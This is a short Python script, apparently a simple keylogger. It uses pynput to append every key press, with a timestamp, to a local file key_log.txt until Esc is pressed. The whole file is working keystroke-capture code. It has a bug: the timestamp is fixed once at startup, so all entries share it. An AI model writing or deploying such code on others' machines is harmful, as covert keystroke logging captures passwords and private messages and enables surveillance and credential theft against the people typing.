from pynput import keyboard
from datetime import datetime

stndtime= datetime.now().strftime('%Y/%m/%d_%H:%M:%S - ')

def on_press(key):
    with open("key_log.txt", "a+") as file:
        file.write(stndtime+str(key)+"\n")
    if key == keyboard.Key.esc:
        return False
        

with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except Exception as e:
        print('{0} was pressed'.format(e.args[0]))
        
